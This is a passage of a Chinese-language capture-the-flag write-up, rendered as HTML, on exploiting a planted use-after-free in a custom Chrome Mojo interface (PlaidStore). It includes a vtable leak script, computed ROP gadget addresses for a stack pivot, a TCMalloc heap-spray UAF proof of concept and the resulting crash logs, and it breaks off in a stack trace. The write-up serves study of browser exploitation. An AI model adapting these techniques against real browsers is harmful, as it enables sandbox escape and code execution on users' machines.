class="line"><span class="actionscript">            <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line"></span><br><span class="line">            Mojo.bindInterface(</span><br><span class="line">                blink.mojom.PlaidStore.name,</span><br><span class="line">                mojo.makeRequest(plaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> plaidStorePtr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x28</span>).fill(<span class="number">0x30</span> + i));</span></span><br><span class="line">            plaidStorePtrList.push(plaidStorePtr);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> PlaidStore_vtable_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意这里使用await，保证异步操作。因为promise回调是同步的。</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取返回的promiseValue</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> res = <span class="keyword">await</span> plaidStorePtrList[i].getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> data = res.data;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x28</span>; j &lt; <span class="number">0x100</span> - <span class="number">0x8</span>; j += <span class="number">0x8</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尽管返回的是string，但仍然可以直接当作十六进制数字来使用。</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> hex = bytes2DWORD(data.slice(j, j + <span class="number">0x8</span>));</span></span><br><span class="line">                if ((hex &amp; 0xfff) == 0x7a0) &#123;</span><br><span class="line">                    PlaidStore_vtable_addr = dec2hex(hex);</span><br><span class="line">                    render_frame_host_addr = dec2hex(bytes2DWORD(data.slice(j + 0x8, j + 0x10)));</span><br><span class="line"><span class="actionscript">                    success(<span class="string">"PlaidStore vtable: "</span> + PlaidStore_vtable_addr);</span></span><br><span class="line"><span class="actionscript">                    success(<span class="string">"render_frame_host: "</span> + render_frame_host_addr);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">break</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (PlaidStore_vtable_addr != 0)</span><br><span class="line"><span class="actionscript">                <span class="keyword">break</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        if (PlaidStore_vtable_addr == 0)</span><br><span class="line"><span class="actionscript">            <span class="keyword">throw</span> <span class="string">"PlaidStore vtable addr leak failed!"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> chromeTextBase = PlaidStore_vtable_addr - <span class="number">0x9fb67a0</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"chrome Text Base: "</span> + dec2hex(chromeTextBase));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xchg_addr = chromeTextBase + <span class="number">0x000000000880dee8</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"xchg_addr: "</span> + dec2hex(xchg_addr));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rdi_ret = chromeTextBase + <span class="number">0x0000000002e4630f</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rdi_ret: "</span> + dec2hex(pop_rdi_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rsi_ret = chromeTextBase + <span class="number">0x0000000002d278d2</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rsi_ret: "</span> + dec2hex(pop_rsi_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rdx_ret = chromeTextBase + <span class="number">0x0000000002e9998e</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rdx_ret: "</span> + dec2hex(pop_rdx_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> pop_rax_ret = chromeTextBase + <span class="number">0x0000000002e651dd</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"pop_rax_ret: "</span> + dec2hex(pop_rax_ret));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> syscall_addr = chromeTextBase + <span class="number">0x0000000002ef528d</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"syscall_addr: "</span> + dec2hex(syscall_addr));</span></span><br><span class="line">    &#125;</span><br><span class="line">    pwn();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>泄露出的地址为</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] PlaidStore vtable: <span class="number">0x557731d667a0</span></span><br><span class="line">[+] render_frame_host: <span class="number">0x2fde7ced7000</span></span><br><span class="line">[+] chrome Text Base: <span class="number">0x557727db0000</span></span><br><span class="line">[+] xchg_addr: <span class="number">0x5577305bdee8</span></span><br><span class="line">[+] pop_rdi_ret: <span class="number">0x55772abf630f</span></span><br><span class="line">[+] pop_rsi_ret: <span class="number">0x55772aad78d2</span></span><br><span class="line">[+] pop_rdx_ret: <span class="number">0x55772ac4998e</span></span><br><span class="line">[+] pop_rax_ret: <span class="number">0x55772ac151dd</span></span><br><span class="line">[+] syscall_addr: <span class="number">0x55772aca528d</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="b-UAF">b. UAF</h3>
+<ul>
+<li>
+<p>由于<code>render_frame_host_</code>的UAF，<code>render_frame_host_</code>指针所指向的<code>RenderFrameHostImpl</code>内存位置是<strong>完全可控</strong>的（因为这块内存可以先被free，后被我们allocate）。</p>
+<p>同时，我们可以利用先前找到的<code>xchg rax, rsp</code>，将<code>$rax</code>值和<code>$rsp</code>值交换，这样就可以<strong>劫持栈</strong>，之后执行我们的<code>gadgets</code>。</p>
+<p>那<code>$rax</code>值应该怎么控制呢？请向下翻页查看下图，当执行虚函数时，<code>%rax</code>值正好为<code>render_frame_host_</code>的虚表地址<code>vtable entry</code>，因此我们还是可以通过控制<code>RenderFrameHostImpl</code>内存区域来设置<code>%rax</code>的值。这里我们设置该<code>vtable entry</code>为<code>render_frame_host_ + 0x10</code>，即，<code>render_frame_host_[0] = render_frame_host_ + 0x10</code>（这段话有点绕，请仔细思考）</p>
+<p>因此，我们完全可以在<code>render_frame_host_</code>指针所指向的内存区域上布置我们的<code>gadgets</code>。</p>
+</li>
+<li>
+<p>但在此之前，我们需要获取一下<code>render_frame_host_</code>所使用的某个虚函数在虚表的相对偏移。这里我们选择获取<code>IsRenderFrameLive</code>虚函数的偏移。</p>
+<p>我们在<code>PlaidStoreImpl::GetData</code>函数下断，单步跟踪几步即可显示该函数的偏移。如图所示，<code>IsRenderFrameLive</code>函数在虚表中的相对偏移为<code>0x160</code>。</p>
+<p><img src="/2020/10/mojo/renderFrameHostFuncOffset.png" alt="img"></p>
+</li>
+<li>
+<p>之后，我们就可以精心构建<code>gadget</code>布局。</p>
+<p><img src="/2020/10/mojo/gadgetMap.jpg" alt="img"></p>
+</li>
+<li>
+<p>在布局<code>gadget</code>前还有一个问题：我们该如何在释放<code>render_frame_host_</code>所指向的内存之后，<strong>再将这块内存分配回来</strong>？这里有个小知识点，<strong>chrome中的内存管理使用的是<code>TCMalloc</code>机制</strong>。又因为<code>StoreData</code>函数分配的<code>vector&lt;uint8_t&gt;</code>与<code>render_frame_host_</code>使用的是同一个分配器，<strong>只要大量分配大小与<code>RenderFrameHostImpl</code>相等的<code>vector</code>，就有可能占位成功。</strong></p>
+<blockquote>
+<p>TCMalloc（Thread-Caching Malloc）实现了高效的多线程内存管理，用于替代系统的内存分配相关的函数 - <a href="https://www.jianshu.com/p/11082b443ddf" target="_blank" rel="noopener">TCMalloc解密</a></p>
+</blockquote>
+<p>那么<code>sizeof(RenderFrameHostImpl)</code>等于多少呢？我们调试看看。</p>
+<p>首先在<code>content::RenderFrameHostImpl::RenderFrameHostImpl</code>构造函数上下断点，并重新执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b content::RenderFrameHostImpl::RenderFrameHostImpl</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure>
+<p>我们的目的是找到执行该构造函数的上一个函数，并查看在执行<code>RenderFrameHostImpl</code>构造函数前，执行<code>operator new</code>时传入的大小。</p>
+<blockquote>
+<p>如图所示，我们的目标是<code>content::RenderFrameHostFactory::Create</code>函数。下断并<strong>重新执行</strong>。</p>
+</blockquote>
+<p><img src="/2020/10/mojo/renderFrameHostSize1.png" alt="img"></p>
+<p>单步跟踪<code>RenderFrameHostFactory::Create</code>函数，在整个函数中只有一处地方调用<code>operator new</code>。而这里的<code>0xc28</code>正是<code>RenderFrameHostImpl</code>的大小。</p>
+<p><img src="/2020/10/mojo/renderFrameHostSize.png" alt="img"></p>
+</li>
+<li>
+<p>当我们创建一个<code>child iframe</code>并建立一个<code>PlaidStoreImpl</code>实例后。如果我们关闭这个<code>child iframe</code>，则对应的<code>RenderFrameHost</code>将会<strong>自动关闭</strong>；但于此同时，<code>child iframe</code>所对应的<code>PlaidStoreImpl</code>与browser建立的mojo管道<strong>将会被断开</strong>。<strong>而该管道一但断开，则<code>PlaidStoreImpl</code>实例将会被析构</strong>。</p>
+<p>因此，我们需要在关闭<code>child iframe</code>之前，将管道的<code>remote</code>端移交给<code>parent iframe</code>，使得<code>child iframe</code>的<code>PlaidStoreImpl</code>实例在iframe关闭后仍然存活。</p>
+<blockquote>
+<p>回想一下，正常情况下，当关闭一个iframe时，<strong>RenderFrameHost将会被析构</strong>、<strong>mojo管道将会被关闭</strong>。此时<strong>Mojo管道的关闭一定会带动PlaidStoreImpl的析构</strong>，这样就可以析构掉所有该析构的对象。</p>
+<p>但这里却没有，因为在关闭<code>child iframe</code>前，已经将该<code>iframe</code>所持有的<strong>Mojo管道<code>Remote</code>端</strong>移交出去了，因此在关闭<code>child iframe</code>时将<strong>不会关闭Mojo管道</strong>。而<code>PlaidStoreImpl</code>的生命周期并没有与<code>RenderFrameHost</code>相关联。即<code>RenderFrameHost</code>的析构<strong>完全不影响</strong><code>PlaidStoreImpl</code>实例的生命周期。所以，<code>PlaidStoreImpl</code>实例将不会被析构。</p>
+</blockquote>
+<p>那么，问题是，<strong>该如何移交Mojo管道的<code>remote</code>端呢？</strong> 答案是：使用<code>MojoInterfaceInterceptor</code>。该功能可以拦截来自同一进程中其他<code>iframe</code>的<code>Mojo.bindInterface</code>调用。在<code>child iframe</code>被销毁前，我们可以利用该功能将mojo管道的一端传递给<code>parent iframe</code>。</p>
+<p>以下是来自其他exp的相关代码，我们可以通过该代码片段来了解<code>MojoInterfaceInterceptor</code>的具体使用方式：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">var kPwnInterfaceName = <span class="string">"pwn"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runs in the child frame</span></span><br><span class="line"><span class="function">function <span class="title">sendPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  var pipe = Mojo.createMessagePipe();</span><br><span class="line">  <span class="comment">// bind the InstalledAppProvider with the child rfh</span></span><br><span class="line">  Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,</span><br><span class="line">    pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pass the endpoint handle to the parent frame</span></span><br><span class="line">  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, <span class="string">"process"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runs in the parent frame</span></span><br><span class="line"><span class="function">function <span class="title">getFreedPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Promise(function (resolve, reject) &#123;</span><br><span class="line">    var frame = allocateRFH(window.location.href + <span class="string">"#child"</span>); <span class="comment">// designate the child by hash</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// intercept bindInterface calls for this process to accept the handle from the child</span></span><br><span class="line">    let interceptor = <span class="keyword">new</span> MojoInterfaceInterceptor(kPwnInterfaceName, <span class="string">"process"</span>);</span><br><span class="line">    interceptor.oninterfacerequest = function(e) &#123;</span><br><span class="line">      interceptor.stop();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// bind and return the remote</span></span><br><span class="line">      var provider_ptr = <span class="keyword">new</span> blink.mojom.InstalledAppProviderPtr(e.handle);</span><br><span class="line">      freeRFH(frame);</span><br><span class="line">      resolve(provider_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    interceptor.start();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>现在，我们已经解决了所有潜在的问题，UAF的利用方式应该是这样的</p>
+<ul>
+<li>将<code>child iframe</code>中Mojo 管道的<code>remote</code>端移交至<code>parent iframe</code>，使得Mojo管道仍然保持连接。</li>
+<li>释放<code>child iframe</code></li>
+<li>多次分配内存，使得分配到原先被释放<code>RenderFrameHostImpl</code>的内存区域</li>
+<li>写入目标数据</li>
+<li>执行<code>child iframe</code>对应的<code>PlaidStoreImpl::GetData</code>函数。</li>
+</ul>
+</li>
+<li>
+<p>写个POC验证一下UAF</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> frame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span></span><br><span class="line">            frame.srcdoc = `</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line">    Mojo.bindInterface(</span><br><span class="line">        blink.mojom.PlaidStore.name,</span><br><span class="line">        mojo.makeRequest(plaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">        <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    plaidStorePtr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x28</span>).fill(<span class="number">0x30</span>));</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.plaidStorePtr = plaidStorePtr;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"iframe loaded"</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span><br><span class="line">`;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(frame);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 在frame加载完成后再异步执行其中的代码</span></span></span><br><span class="line"><span class="javascript">            frame.contentWindow.addEventListener(<span class="string">"DOMContentLoaded"</span>, <span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> childPlaidStorePtr = frame.contentWindow.plaidStorePtr;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(childPlaidStorePtr == <span class="literal">undefined</span> || childPlaidStorePtr == <span class="number">0</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">throw</span> <span class="string">"Error in iframe loading"</span>;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"parent iframe start working"</span>)</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 预先分配0xc28</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xc28</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 将原先buffer转为int64位的数组（内存地址不变</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> uaf_buf = <span class="keyword">new</span> BigUint64Array(buf);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 将对应vtable entry的前8个字节设置为0xdeadbeef（随便设置的易于区分的值）</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 这样当crash时，$rax一定等于0xdeadbeef。</span></span></span><br><span class="line">                uaf_buf[0] = BigInt(0xdeadbeef);</span><br><span class="line"><span class="actionscript">                <span class="comment">// 在parent iframe中建立PlaidStoreImpl实例</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> parentPlaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line">                Mojo.bindInterface(</span><br><span class="line">                    blink.mojom.PlaidStore.name,</span><br><span class="line">                    mojo.makeRequest(parentPlaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                    <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                    <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 释放child iframe</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.removeChild(frame);</span></span><br><span class="line">                frame.remove();</span><br><span class="line"><span class="actionscript">                <span class="comment">// 大量分配内存，用于占位。</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 需要注意这里的storeData的索引要变化，不然每次填充数据都只会在一块内存区域上反复填充。</span></span></span><br><span class="line"><span class="javascript">                    parentPlaidStorePtr.storeData(<span class="string">"1"</span> + i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf));</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"try to uaf crash"</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尝试利用UAF漏洞来Crash</span></span></span><br><span class="line"><span class="actionscript">                childPlaidStorePtr.getData(<span class="string">"aaaa"</span>, <span class="number">0x28</span>);</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">pwn()</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>不过需要注意的是，在该POC中并没有<strong>将<code>child iframe</code>的Mojo管道一端传递给<code>parent iframe</code></strong> 的操作。因为通过调试可知，<code>child iframe</code>在remove后，其所对应的<code>PlaidStoreImpl</code>实例仍然存在，<strong>并没有随着Mojo pipe的关闭而被析构。</strong></p>
+<p>尚未明确具体原因，但这种情况却简化了漏洞利用的方式。</p>
+</blockquote>
+<p>如下图所示，chrome成功在调用<code>RenderFrameHostImpl::IsRenderFrameLive</code>时Crash，并且<code>$eax</code>为目的值<code>0xdeadbeef</code>。</p>
+<p><img src="/2020/10/mojo/UAFPoc.png" alt="img"></p>
+<p>执行输出的log如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kiprey @ Kipwn in /usr/class/CTFs/mojo [14:34:16] C:1</span></span><br><span class="line">$ ./chrome --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest http://localhost:8000/test.html</span><br><span class="line"></span><br><span class="line">DevTools listening on ws://127.0.0.1:1338/devtools/browser/2aaa5e8e-c088-4b7a-ab69-5dfbace58413</span><br><span class="line">127.0.0.1 - - [09/Oct/2020 14:36:39] <span class="string">"GET /test.html HTTP/1.1"</span> 200 -</span><br><span class="line">[1009/143639.113334:INFO:CONSOLE(14)] <span class="string">"iframe loaded"</span>, <span class="built_in">source</span>: about:srcdoc (14)</span><br><span class="line">[1009/143639.114060:INFO:CONSOLE(32)] <span class="string">"parent iframe start working"</span>, <span class="built_in">source</span>: http://localhost:8000/test.html (32)</span><br><span class="line">[1009/143639.168655:INFO:CONSOLE(54)] <span class="string">"try to uaf crash"</span>, <span class="built_in">source</span>: http://localhost:8000/test.html (54)</span><br><span class="line">Received signal 11 SEGV_MAPERR 0000deadc04f</span><br><span class="line"><span class="comment">#0 0x559d6e9c1579 base::debug::CollectStackTrace()</span></span><br><span class="line"><span class="comment">#1 0x559d6e9256f3 base::debug::StackTrace::StackTrace()</span></span><br><span class="line"><span class="comment">#2 0x559d6e9c1120 base::debug::(anonymous namespace)::StackDumpSignalHandler()</span></span><br><span class="line"><span class="comment">#3 0x7f62fcda4520 (/usr/lib/x86_64-linux-gnu/libpthread-2.29.so+0x1351f)</span></span><br><span class="line"><span class="comment">#4 0x559d6cf2e2d4 content::PlaidStoreImpl::GetData()</span></span><br><span class="line"><span class="comment">#5 0x559d6c901e3a blink::mojom::PlaidStoreStubDispatch::AcceptWithResponder()</span></span><br><span class="line"><span class="comment">#6 0x559d6cf2e9c6 blink::mojom::PlaidStoreStub&lt;&gt;::AcceptWithResponder()</span></span><br><span class="line"><span class="comment">#7 0x559d6eaf5878 mojo::InterfaceEndpointClient::HandleValidatedMessage()</span></span><br><span class="line"><span class="comment">#8 0x559d6eafbcf1 mojo::internal::MultiplexRouter::ProcessIncomingMessage()</span></span><br><span class="line"><span class="comment">#9 0x559d6eafb4de mojo::internal::MultiplexRouter::Accept()</span></span><br><span class="line"><span class="comment">#10 0x559d6eaf2e9c mojo::Connector::DispatchMessage()</span></span><br><span class="line"><span class="comment">#11 0x559d6eaf3941 mojo::Connector::ReadAllAvailableMessages()</span></span><br><span class="line"><span class="comment">#12 0x559d6eb0bd48 mojo::SimpleWatcher::OnHandleReady()</span></span><br><span class="line"><span class="comment">#13 0x559d6e96dbeb base::TaskAnnotator::RunTask()</span></span><br><span class="line"><span class="comment">#14 0x559d6e97e47e base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl()</span></span><br><span class="line"><span class="comment">#15 0x559d6e97e211 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork()</span></span><br><span class="line"><span class="comment">#16 0x559d6e93b817 base::(anonymous namespace)::WorkSourceDispatch()</span></span><br><span class="line"><span class="comment">#17 0x7f62fc08af1d g_main_context_dispatch</span></span><br><span class="line"><span class="comment">#18 0x7f62fc08b1a0 (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6200.4+0x5019f)</span></span><br><span class="line"><span class="comment">#19 0x7f62fc08b22f g_main_context_iteration</span></span><br><span class="line"><span class="comment">#20 0x559d6e93b672 base::MessagePumpGlib::Run()</span></span><br><span class="line"><span class="comment">#21 0x559d6e97ecf9 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()</span></span><br><span class="line"><span class="comment">#22 0x559d6e956942 base::RunLoop::Run()</span></span><br><span class="line"><span class="comment">#23 0x559d6cca71f4 content::BrowserMainLoop::RunMainMessageLoopParts()</span></span><br><span class="line"><span class="comment">#24 0x559d6cca90a2 content::BrowserMainRunnerImpl::Run()</span></span><br><span class="line"><span class="comment">#25 0x559d731c5f78 headless::HeadlessContentMainDelegate::RunProcess()</span></span><br><span class="line"><span class="comment">#26 0x559d6e50e306 content::ContentMainRunnerImpl::RunServiceManager()</span></span><br><span class="line"><span class="comment">#27 0x559d6e50dff7 content::ContentMainRunnerImpl::Run()</span></span><br><span class="line"><span class="comment">#28 0x559d6e55c8d3 service_manager::Main()</span></span><br><span class="line"><span class="comment">#29 0x559d6e50c351 content::ContentMain()</span></span><br><span class="line"><span class="comment">#30 0x559d6e55b49d headless::(anonymous 